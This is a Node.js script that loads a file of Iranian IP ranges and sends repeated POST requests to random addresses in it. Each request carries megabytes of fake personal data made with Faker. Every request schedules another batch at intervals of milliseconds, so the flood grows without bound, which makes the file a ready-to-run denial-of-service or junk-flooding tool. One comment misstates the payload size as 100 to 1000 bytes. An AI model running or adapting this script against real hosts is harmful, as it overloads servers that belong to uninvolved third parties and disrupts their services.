const axios = require("axios");
const { faker } = require("@faker-js/faker");
const fs = require("fs");

// Replace the file path with the actual path to the JSON file
const filePath = "./iran_ip_range.json";

// Replace the placeholder number with the desired number of requests
const numberOfRequests = 10;

// Function to generate a random number between min and max (inclusive)
function getRandomSize(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Function to generate sample model data using Faker.js
function generateModelData() {
  return {
    name: faker.person.fullName(),
    email: faker.internet.email(),
    phone: faker.phone.number(),
    address: faker.location.streetAddress(),
    jobTitle: faker.person.jobTitle(),
    gender: faker.person.sex(),
    birthday: faker.date.birthdate(),
  };
}

// Function to send requests to the IP addresses
async function sendRequests() {
  const ipRange = JSON.parse(fs.readFileSync(filePath, "utf-8"));

  for (let i = 0; i < numberOfRequests; i++) {
    const ipAddress = ipRange[Math.floor(Math.random() * ipRange.length)];
    const dataSize = getRandomSize(10000, 100000); // Random data size between 100 and 1000 bytes
    const modelData = generateModelData();
    const requestData = {
      data: JSON.stringify(modelData).repeat(dataSize),
    };

    try {
      const response = await axios.post(
        `http://${ipAddress}/endpoint`,
        requestData
      );
      console.log(`Request sent to ${ipAddress}. Response: ${response.data}`);
    } catch (error) {
      console.error(`Error sending request to ${ipAddress}: ${error.message}`);
    } finally {
      console.log("pong\n");
      runRequestsRandomInterval();
    }
  }
}

// Function to run the requests at random time intervals
function runRequestsRandomInterval() {
  const randomInterval = getRandomSize(5, 60);
  setTimeout(() => {
    console.log("ping");
    sendRequests();
  }, randomInterval);
}

runRequestsRandomInterval();
